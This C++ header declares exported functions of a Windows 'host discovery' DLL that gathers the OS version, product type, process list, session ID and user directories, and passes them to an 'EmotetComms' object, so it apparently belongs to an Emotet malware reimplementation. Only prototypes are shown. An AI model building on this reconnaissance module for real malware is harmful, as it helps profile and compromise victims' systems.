#pragma once

#include "pch.h"
#include "stdio.h"
#include <iostream>
#include <tlhelp32.h>
#include "comms.h"
#include <string>

#define STATUS_SUCCESS (0x00000000)
#define PROCESS_LIST_SIZE 8192
#define BUFSIZE 512

typedef LONG NTSTATUS, * PNTSTATUS;
typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

typedef enum _NT_PRODUCT_TYPE
{
    Undefined = 0,
    NtProductWinNt = 1,
    NtProductLanManNt = 2,
    NtProductServer = 3
} NT_PRODUCT_TYPE, * PNT_PRODUCT_TYPE;

typedef BOOL(WINAPI* RtlGetNtProductTypePtr)(PNT_PRODUCT_TYPE);
typedef HANDLE(WINAPI* CreateToolhelp32SnapshotPtr)(DWORD, DWORD);

#ifdef HOSTDISCOVERY_EXPORT
#define HOSTDISCOVERY __declspec(dllexport) 
#else 
#define HOSTDISCOVERY __declspec(dllimport) 
#endif

HOSTDISCOVERY RTL_OSVERSIONINFOW GetOSVersion();
HOSTDISCOVERY bool GetNtProductType(PNT_PRODUCT_TYPE);
HOSTDISCOVERY int collectOSData();
HOSTDISCOVERY bool generateProcessData(WCHAR*);
HOSTDISCOVERY int getCurrentSessionId();
HOSTDISCOVERY bool HostDiscovery(EmotetComms *);
HOSTDISCOVERY string getCurrentDirectory();
HOSTDISCOVERY string getUserRootDirectory();